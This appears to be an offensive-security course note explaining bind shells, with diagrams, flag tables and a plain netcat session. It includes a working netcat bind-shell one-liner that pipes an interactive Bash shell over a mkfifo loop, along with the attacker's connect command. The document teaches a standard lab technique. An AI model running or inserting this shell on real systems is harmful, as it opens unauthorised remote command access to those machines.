# 04 — Bind Shells

## Overview

A **bind shell** is when the **target starts a listener** and waits for the attacker to connect to it. The target "binds" a shell to a port, and you reach out to grab it.

```
┌──────────────────┐          ┌──────────────────┐
│   Attack Box     │          │   Target         │
│   10.10.14.15    │  ──────► │   10.10.14.20    │
│   (client)       │ connects │   :7777 (server) │
│                  │    to    │   Listening...    │
└──────────────────┘          └──────────────────┘
```

> **You connect TO the target.** The target is the server, you are the client.

---

## Challenges with Bind Shells

| Problem | Why It's an Issue |
|---------|-------------------|
| Listener must already be running | You need a way to start it on the target first |
| Inbound firewall rules | Most firewalls block unexpected incoming connections |
| NAT / PAT | Target behind a router may not be directly reachable |
| OS firewalls | Windows Firewall / iptables will likely block the port |
| Easier to detect | Incoming connections are more suspicious to defenders |

> 💡 Bind shells are **easier to defend against** than reverse shells because the connection is inbound to the target — firewalls are designed to block exactly this.

---

## Step-by-Step: Basic Netcat TCP Session

This first example is **not a shell** — just a text pipe between two machines.

### 1. Target starts a listener:

```bash
nc -lvnp 7777
```
> Starts a netcat listener on port 7777. Nothing is connected yet — the target is just waiting for an incoming connection.

| Flag | Meaning |
|------|---------|
| `-l` | Listen mode |
| `-v` | Verbose output |
| `-n` | No DNS resolution |
| `-p 7777` | Listen on port 7777 |

### 2. Attacker connects:

```bash
nc -nv 10.129.41.200 7777
```
> Connects to the target's listener. `-n` skips DNS, `-v` shows connection status.

### 3. You can now send text back and forth:

```
# Attack box types:
Hello Academy

# Target sees:
Hello Academy
```

> This proves the connection works, but you can only send text — no command execution, no file system access.

---

## Step-by-Step: Real Bind Shell

To get an actual **interactive shell**, the target must pipe Bash into the Netcat connection.

### 1. Target — Bind Bash to the listener:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```
> Creates a named pipe (FIFO) to loop data through bash and back out over the network. Your commands come in through netcat, flow into bash, and bash output flows back to you.

**Breaking this down:**

| Command | What It Does |
|---------|-------------|
| `rm -f /tmp/f` | Remove the named pipe if it already exists |
| `mkfifo /tmp/f` | Create a named pipe (FIFO) at `/tmp/f` |
| `cat /tmp/f` | Read from the pipe (receives your commands) |
| `\| /bin/bash -i 2>&1` | Pipe into an interactive Bash shell, redirect stderr to stdout |
| `\| nc -l 10.129.41.200 7777` | Pipe Bash output into Netcat listener on port 7777 |
| `> /tmp/f` | Redirect Netcat's input (your commands) back into the pipe |

**The data flow:**

```
Your commands → nc (network) → /tmp/f (pipe) → bash → nc (network) → Your screen
```

### 2. Attacker — Connect and get a shell:

```bash
nc -nv 10.129.41.200 7777
```
> Connects to the bind shell. Once connected, every line you type is sent to bash on the target and the output comes back to your terminal.

```
Target@server:~$    ← You now have an interactive shell on the target
```

---

## Bind Shell vs Plain Netcat Session

| Feature | Plain Netcat Session | Bind Shell |
|---------|---------------------|------------|
| Send text | ✅ | ✅ |
| Run commands | ❌ | ✅ |
| Access file system | ❌ | ✅ |
| Interactive shell | ❌ | ✅ |
| Requires Bash piping | No | Yes |

---

## Key Takeaways

| Point | Detail |
|-------|--------|
| **Direction** | Attacker connects TO target (inbound) |
| **Who listens** | Target listens, attacker connects |
| **Firewall impact** | Easily blocked — inbound connections are suspicious |
| **Detection risk** | High — defenders watch for open listening ports |
| **When to use** | Internal network, no firewall between you and target |
| **Better alternative** | Reverse shells (covered next section) |

> Bind shells work great in labs with no security controls. In real engagements, **reverse shells** are almost always preferred because outbound connections are harder to block.
